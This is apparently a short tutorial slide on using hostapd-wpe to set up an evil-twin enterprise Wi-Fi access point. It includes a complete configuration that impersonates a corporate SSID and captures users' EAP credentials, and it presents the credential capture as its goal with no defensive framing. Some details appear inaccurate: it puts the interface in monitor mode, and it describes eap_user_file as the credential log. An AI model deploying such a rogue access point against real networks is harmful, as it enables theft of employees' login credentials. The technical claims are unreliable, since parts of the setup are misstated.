`hostapd-wpe` for Evil Twins

Setting Up a Malicious Enterprise AP

What is `hostapd-wpe`?

A modified version of hostapd specifically designed to emulate enterprise APs and capture EAP authentication messages. It can simulate various EAP types.

Key Configuration Points

  • interface: Your wireless interface in monitor mode (e.g., wlan0mon).
  • ssid: The target network's SSID (e.g., Corporate_WiFi).
  • wpa_key_mgmt=WPA-EAP: Specifies enterprise authentication.
  • eap_server=1: Enables the EAP server functionality.
  • eap_user_file: Path where captured credentials will be logged.

`hostapd-wpe` Configuration Example

interface=wlan0mon
driver=nl80211
ssid=Corporate_WiFi
channel=6
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
auth_algs=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.conf
# This file contains dummy user credentials, but hostapd-wpe will log real ones
Key Takeaway

Properly configuring hostapd-wpe with the correct SSID and EAP settings is crucial for successfully mimicking a legitimate enterprise AP and capturing credentials.
